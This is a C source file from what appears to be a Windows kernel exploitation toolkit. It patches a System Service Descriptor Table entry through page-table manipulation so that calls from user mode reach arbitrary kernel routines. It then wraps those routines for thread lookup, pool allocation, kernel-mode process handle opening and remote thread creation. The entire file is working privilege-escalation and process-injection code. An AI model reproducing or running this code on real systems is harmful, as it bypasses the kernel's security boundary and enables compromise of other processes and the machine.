#include "kfuncs.h"
#include "pager.h"
#include "kinfo.h"
#include <stdio.h>

typedef struct PatchedSddtInfo {
	DWORD* pServiceEntry;
	PVOID syscallAddress;
	ULONG64 kServiceEntryVa;
	ULONG64 KiServiceTableVa;
	ULONG64 savedServiceEntry;
	SavePageEntry savedPml4e;
} PatchedSddtInfo;
PatchedSddtInfo patchedSddtInfo;

static void restoreSddt()
{
	restorePageEntry(&patchedSddtInfo.savedPml4e);
	printf("[+] restored SSDT\n");
}

BOOL patchSddt()
{
	// find the address of system call service entry for NtCreateTransaction
	// Note: NtCreateTransaction import cannot be used because loaded into "jmp imm32", "jmp [rip+imm]" is replaced
	ULONG64 ntCreateTransactionVa = findKernelExportVa("NtCreateTransaction");

	ULONG64* pKeServiceDescriptorTable = (ULONG64*)walkPage(getKeServiceDescriptorTableVa());
	ULONG64 KiServiceTableVa = pKeServiceDescriptorTable[0];
	ULONG64 KiServiceTableNumber = pKeServiceDescriptorTable[2];

	int shiftedRva = (int)(ntCreateTransactionVa - KiServiceTableVa) << 4;
	DWORD* services = (DWORD*)walkPage(KiServiceTableVa);
	for (int i = 0; i < KiServiceTableNumber; i++) {
		if ((services[i] & 0xfffffff0) == shiftedRva) {
			// found
			printf("[+] found target service. idx=0x%x, value=0x%x\n", i, services[i]);
			patchedSddtInfo.savedServiceEntry = services[i];
			patchedSddtInfo.KiServiceTableVa = KiServiceTableVa;
			patchedSddtInfo.kServiceEntryVa = KiServiceTableVa + i * 4;
			break;
		}
	}

	//printf("[.] NtCreateTransaction shifted RVA: 0x%x\n", shiftedRva);
	PageChainInfo pageChainInfo;
	patchedSddtInfo.pServiceEntry = (DWORD*)newPageTableChain(patchedSddtInfo.kServiceEntryVa, &pageChainInfo, &patchedSddtInfo.savedPml4e);
	printf("[+] patchedSddtInfo.savedPml4e.value: 0x%llx, old: 0x%llx\n", *patchedSddtInfo.savedPml4e.pEntry, patchedSddtInfo.savedPml4e.value);

	patchedSddtInfo.syscallAddress = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateTransaction");
	//printf("patchedSddtInfo.syscallAddress = 0x%p\n", patchedSddtInfo.syscallAddress);

	atexit(restoreSddt);

	return TRUE;
}

static inline void setSyscallTarget(ULONG64 va)
{
	// last 4 bits is number of syscall arguments passed using the stack
	*patchedSddtInfo.pServiceEntry =
		(DWORD)((va - patchedSddtInfo.KiServiceTableVa) << 4) | (patchedSddtInfo.savedServiceEntry & 0xf);
}

// this function makes sure the TLB cache of kernel service function is belonged to this process
// this process page table make the service entry accessible from user mode
// So this function MUST be called for getting syscall function address before calling
// don't use "patchedSddtInfo.syscallAddress" directly
static volatile DWORD dummyVal;
PVOID __declspec(noinline) getCallAddr()
{
	PVOID addr = NULL;
	do {
		__try {
			dummyVal = *(DWORD*)patchedSddtInfo.kServiceEntryVa;
			addr = patchedSddtInfo.syscallAddress;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			// execute exception likely to clear TLB cache of wrong kernel service function
		}
	} while (addr == NULL);
	return addr;
}

ULONG64 KeGetCurrentThread()
{
	typedef ULONG64 KeGetCurrentThreadFn(); // return PETHREAD

	static ULONG64 KeGetCurrentThreadVa;
	if (KeGetCurrentThreadVa == 0) {
		KeGetCurrentThreadVa = findKernelExportVa("KeGetCurrentThread");
	}
	setSyscallTarget(KeGetCurrentThreadVa);

	return ((KeGetCurrentThreadFn*)getCallAddr())();
}

// return EPROCESS Virtual Address of specific pid
ULONG64 PsLookupProcessByProcessId(DWORD pid)
{
	typedef NTSTATUS PsLookupProcessByProcessIdFn(DWORD, PULONG_PTR); // return PETHREAD

	static ULONG64 PsLookupProcessByProcessIdVa;
	if (PsLookupProcessByProcessIdVa == 0) {
		PsLookupProcessByProcessIdVa = findKernelExportVa("PsLookupProcessByProcessId");
	}
	setSyscallTarget(PsLookupProcessByProcessIdVa);

	ULONG_PTR eprocessVa;
	NTSTATUS status = ((PsLookupProcessByProcessIdFn*)getCallAddr())(pid, &eprocessVa);
	if (status == STATUS_SUCCESS) {
		return eprocessVa;
	}
	return 0;
}

#define POOL_FLAG_NON_PAGED               0x0000000000000040UI64
ULONG64 ExAllocatePool2(ULONG64 Flags, SIZE_T NumberOfBytes, ULONG Tag)
{
	typedef ULONG64 ExAllocatePool2Fn(ULONG64, SIZE_T, ULONG); // return PVOID

	static ULONG64 ExAllocatePool2Va;
	if (ExAllocatePool2Va == 0) {
		ExAllocatePool2Va = findKernelExportVa("ExAllocatePool2");
	}
	setSyscallTarget(ExAllocatePool2Va);

	return ((ExAllocatePool2Fn*)getCallAddr())(Flags, NumberOfBytes, Tag);
}

void ExFreePool(ULONG64 va)
{
	typedef void ExFreePoolFn(ULONG64);

	static ULONG64 ExFreePoolVa;
	if (ExFreePoolVa == 0) {
		ExFreePoolVa = findKernelExportVa("ExFreePool");
	}
	setSyscallTarget(ExFreePoolVa);

	return ((ExFreePoolFn*)getCallAddr())(va);
}

// https://www.stormshield.com/news/how-to-run-userland-code-from-the-kernel-on-windows-version-2-0/#undefined
typedef CCHAR KPROCESSOR_MODE;
typedef enum _MODE {
	KernelMode,
	UserMode,
	MaximumMode
} MODE;
static NTSTATUS ObOpenObjectByPointer(PVOID Object, ULONG HandleAttributes, PVOID/*PACCESS_STATE*/ PassedAccessState, ACCESS_MASK DesiredAccess, PVOID/*POBJECT_TYPE*/ ObjectType, KPROCESSOR_MODE AccessMode, PHANDLE outHandle)
{
	typedef NTSTATUS ObOpenObjectByPointerFn(PVOID, ULONG, PVOID, ACCESS_MASK, PVOID, KPROCESSOR_MODE, PHANDLE);

	static ULONG64 ObOpenObjectByPointerVa;
	if (ObOpenObjectByPointerVa == 0) {
		ObOpenObjectByPointerVa = findKernelExportVa("ObOpenObjectByPointer");
	}
	setSyscallTarget(ObOpenObjectByPointerVa);

	return ((ObOpenObjectByPointerFn*)getCallAddr())(Object, HandleAttributes, PassedAccessState, DesiredAccess, ObjectType, AccessMode, outHandle);
}

NTSTATUS KernelOpenProcess(PVOID eprocessVa, PHANDLE outHandle)
{
	static PVOID PsProcessType;
	if (PsProcessType == NULL) {
		ULONG64 ptrVa = findKernelExportVa("PsProcessType");
		PsProcessType = (PVOID)pager_readU64(ptrVa);
	}
	return ObOpenObjectByPointer(eprocessVa, OBJ_KERNEL_HANDLE, NULL, STANDARD_RIGHTS_READ, PsProcessType, KernelMode, outHandle);
}

NTSTATUS KernelClose(HANDLE handle)
{
	// use ZwClose instead of NtClose because we want to it as if a call is from kernel mode
	// Zw* will change KTHREAD->PreviousMode to KernelMode before re-invoking syscall
	typedef NTSTATUS ZwCloseFn(HANDLE);

	static ULONG64 ZwCloseVa;
	if (ZwCloseVa == 0) {
		ZwCloseVa = findKernelExportVa("ZwClose");
	}
	setSyscallTarget(ZwCloseVa);

	return ((ZwCloseFn*)getCallAddr())(handle);
}

NTSTATUS KernelRtlCreateUserThread(
	_In_ HANDLE Process,
	_In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
	_In_ BOOLEAN CreateSuspended,
	_In_opt_ ULONG ZeroBits,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ SIZE_T CommittedStackSize,
	_In_ PUSER_THREAD_START_ROUTINE StartAddress,
	_In_opt_ PVOID Parameter,
	_Out_opt_ PHANDLE Thread,
	_Out_opt_ PCLIENT_ID ClientId)
{
	typedef NTSTATUS KernelRtlCreateUserThreadFn(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PUSER_THREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);

	static ULONG64 RtlCreateUserThreadVa;
	if (RtlCreateUserThreadVa == 0) {
		RtlCreateUserThreadVa = findKernelExportVa("RtlCreateUserThread");
	}
	setSyscallTarget(RtlCreateUserThreadVa);

	return ((KernelRtlCreateUserThreadFn*)getCallAddr())(Process, ThreadSecurityDescriptor, CreateSuspended,
		ZeroBits, MaximumStackSize, CommittedStackSize, StartAddress, Parameter, Thread, ClientId);
}

NTSTATUS KernelCreateRemoteThread(HANDLE hProcess, PUSER_THREAD_START_ROUTINE StartAddress, PVOID Parameter, PHANDLE Thread, PCLIENT_ID ClientId)
{
	return KernelRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, StartAddress, Parameter, Thread, ClientId);
}

NTSTATUS KeSetEvent(ULONG64 EventVa, KPRIORITY Increment, BOOLEAN Wait)
{
	typedef NTSTATUS KeSetEventFn(ULONG64, KPRIORITY, BOOLEAN);

	static ULONG64 KeSetEventVa;
	if (KeSetEventVa == 0) {
		KeSetEventVa = findKernelExportVa("KeSetEvent");
	}
	setSyscallTarget(KeSetEventVa);

	return ((KeSetEventFn*)getCallAddr())(EventVa, Increment, Wait);
}

NTSTATUS KeClearEvent(ULONG64 EventVa)
{
	typedef NTSTATUS KeClearEventFn(ULONG64);

	static ULONG64 KeClearEventVa;
	if (KeClearEventVa == 0) {
		KeClearEventVa = findKernelExportVa("KeClearEvent");
	}
	setSyscallTarget(KeClearEventVa);

	return ((KeClearEventFn*)getCallAddr())(EventVa);
}
